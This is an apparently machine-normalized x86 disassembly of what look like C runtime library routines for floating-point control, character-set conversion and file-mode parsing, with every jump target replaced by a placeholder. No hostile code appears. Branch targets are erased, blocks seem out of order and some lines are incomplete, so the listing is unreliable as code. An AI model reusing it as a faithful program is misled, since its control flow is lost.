cmp [ rw-data ] 0x1
jl r-xdata
push esi
call sub_4223a0
pop ecx
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ax [ ebp - 0x4 ]
xor esi esi
test al 0x1
je r-xdata
or ecx 0x300
jmp r-xdata
mov eax esi
and edi 0x308031f
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
test al al
jns r-xdata
test al 0x4
je r-xdata
push 0x10
pop esi
test eax 0x200
je r-xdata
push 0x10
pop ecx
test al 0x8
je r-xdata
or esi 0x8
test eax 0x400
je r-xdata
or ecx 0x8
test al 0x10
je r-xdata
or esi 0x4
test eax 0x800
je r-xdata
or ecx 0x4
test al 0x20
je r-xdata
or esi 0x2
test edx eax
je r-xdata
or ecx 0x2
test al 0x2
je r-xdata
or esi 0x1
test eax 0x100
je r-xdata
or ecx 0x1
movzx edx ax
mov ecx edx
and ecx ebx
je r-xdata
or esi 0x80000
mov edx eax
mov ebx 0x6000
and edx ebx
je r-xdata
or ecx 0x80000
and edx 0x300
je r-xdata
cmp ecx 0x400
je r-xdata
push 0x40
and eax 0x8040
pop ebx
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or esi 0x20000
cmp edx 0x200
jne r-xdata
or esi 0x100
cmp ecx 0x800
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or esi 0x40000
mov edx 0x1000
test dx ax
je r-xdata
or esi 0x10000
jmp r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov eax ecx
or ecx esi
xor eax esi
test eax 0x8031f
je r-xdata
push eax
call sub_421f15
push eax
mov [ ebp - 0xc ] eax
call sub_42388d
pop ecx
pop ecx
stmxcsr [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
xor ecx ecx
test al al
jns r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx ebx
jne r-xdata
or esi 0x300
jmp r-xdata
mov eax ecx
jmp r-xdata
or ecx 0x80000000
test eax 0x200
je r-xdata
push 0x10
pop ecx
mov eax edi
and edi [ ebp + 0x8 ]
not eax
and eax ecx
or eax edi
cmp eax ecx
je r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test eax 0x400
je r-xdata
or ecx 0x8
test eax 0x800
je r-xdata
or ecx 0x4
test eax 0x1000
je r-xdata
or ecx 0x2
test eax 0x100
je r-xdata
or ecx 0x1
mov edx eax
mov edi 0x6000
and edx edi
je r-xdata
or ecx 0x80000
and eax 0x8040
sub eax ebx
je r-xdata
cmp edx 0x2000
je r-xdata
or ecx 0x2000000
sub eax 0x7fc0
je r-xdata
or ecx 0x100
cmp edx 0x4000
je r-xdata
or ecx 0x3000000
jmp r-xdata
sub eax ebx
jne r-xdata
or ecx 0x200
jmp r-xdata
cmp edx edi
jne r-xdata
or ecx 0x1000000
jmp r-xdata
or ecx 0x300
jmp r-xdata
sub_4223a0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
test cl 0x10
je r-xdata
test cl 0x8
je r-xdata
inc eax
test cl 0x4
je r-xdata
or eax 0x4
test cl 0x2
je r-xdata
or eax 0x8
test cl 0x1
je r-xdata
or eax 0x10
test ecx 0x80000
je r-xdata
or eax 0x20
push esi
mov edx ecx
mov esi 0x300
push edi
mov edi 0x200
and edx esi
je r-xdata
or eax 0x2
mov edx ecx
and edx 0x30000
je r-xdata
cmp edx 0x100
je r-xdata
or eax esi
cmp edx 0x10000
jne r-xdata
or eax 0x400
cmp edx edi
je r-xdata
pop ebp
retn
or eax 0x1000
pop edi
pop esi
test ecx 0x40000
je r-xdata
or eax edi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp edx esi
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_422439
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_414048
mov eax [ ebp - 0x14 ]
test edi edi
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ edi ] ax
cmp [ eax + 0xa8 ] esi
jne r-xdata
cmp [ eax + 0xa8 ] esi
jne r-xdata
push esi
push esi
or esi 0xffffffff
push esi
push [ ebp + 0xc ]
push 0x9
push [ eax + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
lea ecx [ esi + 0x1 ]
push ebx
push edi
or esi 0xffffffff
push esi
push [ ebp + 0xc ]
push 0x9
push [ eax + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
test ebx ebx
je r-xdata
lea esi [ eax - 0x1 ]
call sub_41529e
mov [ eax ] 0x2a
jmp r-xdata
mov al [ esi ]
inc esi
test al al
jne r-xdata
sub esi ecx
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x350 ] 0xfffffffd
call sub_41529e
mov [ eax ] 0x2a
xor eax eax
mov [ edi ] ax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx eax
mov [ ebp - 0x4 ] ecx
mov edx ebx
test ebx ebx
je r-xdata
inc esi
add edi 0x2
cmp esi ebx
jb r-xdata
push ebx
push edi
sub ecx eax
push ecx
push eax
mov eax [ ebp - 0x14 ]
push 0x1
push [ eax + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov al [ ecx ]
dec edx
mov [ ebp - 0x8 ] edx
test al al
je r-xdata
movzx eax [ esi + ecx ]
mov [ edi ] ax
cmp [ esi + ecx ] 0x0
je r-xdata
jmp r-xdata
mov esi eax
jmp r-xdata
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
movzx eax al
push ecx
push eax
call sub_41de1d
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
inc ecx
mov [ ebp - 0x4 ] ecx
test edx edx
jne r-xdata
inc ecx
cmp [ ecx ] 0x0
je r-xdata
sub_4225b2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
test edi edi
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] ax
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
jmp r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
jmp r-xdata
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
call sub_414048
mov eax ebx
cmp [ ebp + 0x18 ] ebx
ja r-xdata
mov [ eax ] esi
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
push [ ebp + 0x14 ]
push edi
call sub_422439
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
call sub_41529e
push 0x16
jmp r-xdata
inc eax
test edi edi
je r-xdata
test edi edi
je r-xdata
pop esi
mov [ eax ] esi
call sub_413b01
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
cmp eax ebx
jbe r-xdata
call sub_41529e
mov esi [ eax ]
jmp r-xdata
xor eax eax
mov [ edi ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ecx ] eax
xor ecx ecx
mov [ edi + eax * 2 - 0x2 ] cx
cmp [ ebp + 0x18 ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
push 0x50
mov eax ebx
pop esi
xor eax eax
mov [ edi ] ax
call sub_41529e
push 0x22
sub_422695
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4225b2
add esp 0x18
pop ebp
retn
sub_4226b5
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
xor esi esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x14 ] edi
test eax eax
je r-xdata
test edi edi
jne r-xdata
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
call sub_414048
mov ecx [ ebp - 0x18 ]
test ecx ecx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
mov edx [ ebp - 0x28 ]
cmp [ edx + 0xa8 ] esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push esi
push esi
push 0xffffffff
push edi
push esi
push [ eax + 0x8 ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ edi ]
test ax ax
je r-xdata
cmp [ edx + 0x4 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
call sub_41529e
or edi 0xffffffff
mov [ eax ] 0x2a
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov edi esi
jmp r-xdata
mov edx 0xff
lea eax [ ebp - 0x10 ]
push eax
push esi
push ebx
push ecx
push 0xffffffff
push edi
push esi
push [ edx + 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test edi edi
je r-xdata
test ebx ebx
je r-xdata
mov edx 0xff
mov eax edi
mov ecx [ ebp - 0x2c ]
and [ ecx + 0x350 ] 0xfffffffd
lea edi [ eax - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
add edi 0x2
inc esi
movzx eax [ edi ]
test ax ax
jne r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
push ebx
push ecx
push ebx
push edi
push esi
push [ edx + 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax edi
mov [ ebp - 0x14 ] ebx
call sub_41529e
or esi 0xffffffff
mov [ eax ] 0x2a
jmp r-xdata
mov al [ edi ]
mov [ ecx + esi ] al
mov ax [ edi ]
add edi 0x2
test ax ax
je r-xdata
cmp ax dx
ja r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea esi [ edi - 0x1 ]
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
add eax 0x2
sub [ ebp - 0x14 ] 0x1
jne r-xdata
inc esi
cmp esi ebx
jb r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + esi - 0x1 ] 0x0
jne r-xdata
cmp [ eax ] si
jne r-xdata
cmp [ eax ] si
je r-xdata
cmp [ edi ] dx
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
dec esi
jmp r-xdata
mov ebx eax
sub ebx edi
sar ebx 0x1
inc ebx
lea ebx [ ebp - 0x10 ]
push ebx
push esi
push ecx
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
push eax
push esi
push [ edx + 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov ebx [ ebp + 0x10 ]
mov edx eax
test edx edx
je r-xdata
push 0x5
pop ecx
cmp [ ebp - 0x10 ] esi
jne r-xdata
test edx edx
js r-xdata
cmp edx 0x5
ja r-xdata
lea eax [ edx + edi ]
cmp eax ebx
ja r-xdata
mov eax esi
mov [ ebp - 0x1c ] eax
test edx edx
jle r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x2
mov [ ebp - 0x14 ] eax
cmp edi ebx
jb r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x28 ]
mov ecx [ edx + 0x4 ]
cmp ecx 0x5
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
inc eax
inc edi
mov [ ebp - 0x1c ] eax
cmp eax edx
jl r-xdata
mov al [ ebp + eax - 0xc ]
mov [ ecx + edi ] al
test al al
je r-xdata
sub_422936
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0x10 ]
test esi esi
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
test esi esi
je r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov [ esi ] al
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax edi
cmp [ ebp + 0x18 ] edi
ja r-xdata
mov [ ebx ] eax
cmp eax 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_4226b5
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
call sub_41529e
push 0x16
jmp r-xdata
inc eax
test esi esi
je r-xdata
test esi esi
je r-xdata
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp eax edi
jbe r-xdata
call sub_41529e
mov eax [ eax ]
jmp r-xdata
mov [ esi ] 0x0
pop ebx
mov eax ecx
mov [ ebx ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ebp + 0x18 ] 0xffffffff
je r-xdata
test ebx ebx
je r-xdata
push 0x50
mov eax edi
pop ecx
jmp r-xdata
mov [ esi ] 0x0
cmp edi eax
ja r-xdata
mov [ eax + esi - 0x1 ] 0x0
jmp r-xdata
call sub_41529e
push 0x22
sub_422a03
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_414048
mov eax [ ebp - 0x14 ]
xor edi edi
push edi
push edi
push [ ebp + 0x10 ]
mov eax [ eax + 0x8 ]
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
call sub_41c093
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea edx [ ebx + ebx ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax edi
lea esp [ ebp - 0x24 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
and [ eax + 0x350 ] 0xfffffffd
mov esi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_40f0cb
pop ecx
push ebx
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41c093
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_419b3e
mov esi eax
pop ecx
test esi esi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_4297c0
mov esi esp
test esi esi
je r-xdata
mov eax [ ebp + 0x18 ]
push edi
push edi
push eax
neg eax
sbb eax eax
and eax [ ebp + 0x14 ]
push eax
push 0xffffffff
push esi
push edi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_422afe
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
xor edi edi
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x88 ] esi
mov [ ebx ] edi
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push [ ebp + 0x14 ]
push esi
push ecx
call sub_422a03
add esp 0x14
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
test eax eax
jne r-xdata
push edi
push edi
push [ ebp + 0x14 ]
push esi
call sub_41c093
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push 0x1
push eax
call sub_41942e
push edi
mov [ ebx ] eax
call sub_41a3a5
add esp 0xc
cmp [ ebx ] edi
je r-xdata
or eax 0xffffffff
push 0x2
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x88 ] edi
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push esi
call sub_41c093
test eax eax
je r-xdata
push 0x2
push eax
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
push edi
push [ ebp + 0x14 ]
push esi
push [ ebp - 0x90 ]
call sub_422a03
add esp 0x14
mov [ ebp - 0x8c ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x8c ]
lea eax [ ecx - 0x1 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
push ecx
push [ ebx ]
call sub_42747b
add esp 0x10
test eax eax
jne r-xdata
mov al [ ebp - 0x88 ]
mov [ ebx ] al
jmp r-xdata
or edi 0xffffffff
push [ ebp - 0x8c ]
push esi
push [ ebp + 0x14 ]
push [ ebp - 0x88 ]
call sub_41c093
jmp r-xdata
push 0x1
push eax
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_413b2e
int3
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
push [ ebp - 0x8c ]
push esi
push [ ebp + 0x14 ]
push [ ebp - 0x88 ]
push [ ebp - 0x90 ]
call sub_422a03
add esp 0x14
mov eax esi
mov esi edi
mov [ ebx ] eax
jmp r-xdata
push esi
call sub_41a3a5
pop ecx
mov eax edi
jmp r-xdata
sub_422cb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea edi [ ebp - 0x10 ]
stosd [ edi ]
lea esi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov esi [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
xor ecx ecx
cmp al 0x61
je r-xdata
mov [ ebx ] 0x109
cmp al 0x72
je r-xdata
mov ch [ ebp - 0x1 ]
movsx eax al
cmp eax 0x53
jg r-xdata
mov [ ebx ] ecx
mov [ ebx + 0x4 ] 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
sub eax 0x54
je r-xdata
je r-xdata
mov dl cl
mov [ ebp - 0x3 ] cl
mov ch cl
mov [ ebp - 0x4 ] cl
inc esi
mov [ ebp - 0x2 ] dl
mov [ ebp - 0x1 ] ch
mov cl 0x1
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov [ ebx ] 0x301
jmp r-xdata
test ch ch
jne r-xdata
push ebx
call sub_422f82
sub eax 0xe
je r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
sub eax 0x20
je r-xdata
mov [ ebx + 0x4 ] 0x2
push 0x3
push r--data
push esi
call sub_416100
add esp 0xc
test eax eax
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
jmp r-xdata
push ebx
call sub_422fa1
jmp r-xdata
sub eax 0x1
je r-xdata
xor cl cl
jmp r-xdata
or [ ebx ] 0x20
mov ch [ ebp - 0x1 ]
sub eax 0xb
je r-xdata
push 0x20
add esi 0x3
pop eax
jmp r-xdata
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
test ch ch
je r-xdata
mov dl [ ebp - 0x2 ]
pop ecx
mov cl al
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_422fc1
jmp r-xdata
sub eax 0xb
je r-xdata
xor eax eax
test cl cl
setne al
add esi eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_423005
sub eax 0x1
je r-xdata
cmp [ esi ] al
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
pop ecx
jmp r-xdata
lea eax [ ebp - 0x3 ]
push eax
push ebx
call sub_422fe3
jmp r-xdata
sub eax 0x6
jne r-xdata
mov ch 0x1
mov [ ebp - 0x1 ] ch
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
push ebx
call sub_42303a
jmp r-xdata
push ebx
call sub_422f67
jmp r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] al
je r-xdata
or [ ebx ] 0x80
mov cl 0x1
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_4279ea
add esp 0xc
test eax eax
jne r-xdata
mov ch [ ebp - 0x1 ]
test dl dl
jne r-xdata
push 0x8
push r--data
push esi
call sub_4279ea
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or [ ebx ] 0x40000
jmp r-xdata
or [ ebx ] 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_4279ea
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or [ ebx ] 0x20000
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
mov dl 0x1
mov [ ebp - 0x2 ] dl
mov cl dl
jmp r-xdata
add esi 0x7
or [ ebx ] 0x10000
jmp r-xdata
inc esi
jmp r-xdata
sub_422ee2
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_422cb0
mov esi eax
lea edi [ ebp - 0x10 ]
pop ecx
pop ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x8 ] 0x0
pop edi
pop esi
jne r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push eax
call sub_428138
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
add eax 0xc
mov ecx [ ebp - 0xc ]
[ eax ] ecx
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x1c ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_422f67
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test al 0x40
je r-xdata
or eax 0x40
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_422f82
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx 0x1000
mov eax [ ecx ]
test edx eax
je r-xdata
or eax edx
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_422fa1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax 0xc000
je r-xdata
or eax 0x8000
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_422fc1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
or [ ecx + 0x4 ] 0x800
pop ebp
retn
xor al al
pop ebp
retn
sub_422fe3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov al 0x1
and [ ecx + 0x4 ] 0xfffff7ff
pop ebp
retn
xor al al
pop ebp
retn
sub_423005
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ eax ] 0x1
mov eax [ edx ]
test al 0x2
jne r-xdata
xor al al
pop ebp
retn
mov ecx [ edx + 0x4 ]
and eax 0xfffffffe
or eax 0x2
and ecx 0xfffffffc
or ecx 0x4
mov [ edx ] eax
mov [ edx + 0x4 ] ecx
mov al 0x1
pop ebp
retn
sub_42303a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax 0xc000
je r-xdata
or eax 0x4000
mov [ ecx ] eax
mov al 0x1
pop ebp
retn
xor al al
pop ebp
retn
sub_423065
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_423099
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebx + 0x20 ]
lea eax [ ebx + 0x18 ]
push edi
push esi
push eax
push [ ebx + 0x8 ]
call sub_423167
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_423065
pop ecx
mov edi eax
call sub_417cac
test al al
je r-xdata
and [ ebp - 0x40 ] 0xfffffffe
push eax
lea eax [ ebx + 0x18 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_42336a
mov esi [ ebx + 0x20 ]
add esp 0x1c
push edi
call sub_42365b
mov [ esp ] 0xffff
push esi
call sub_423916
fld [ ebx + 0x18 ]
pop ecx
pop ecx
test edi edi
je r-xdata
fld [ ebx + 0x18 ]
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push edi
call sub_42368a
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_423167
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ebx
and esi 0x1f
test bl 0x8
je r-xdata
mov eax ebx
and eax [ ebp + 0x10 ]
test al 0x4
je r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
test bl 0x1
je r-xdata
push 0x4
call sub_423942
pop ecx
and esi 0xfffffffb
jmp r-xdata
push 0x1
call sub_423942
pop ecx
and esi 0xfffffff7
jmp r-xdata
test bl 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
test bl 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_423942
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
push edi
xor edi edi
test bl 0x10
je r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_423942
pop ecx
and esi 0xffffffef
mov ecx [ ebp + 0xc ]
fld [ ecx ]
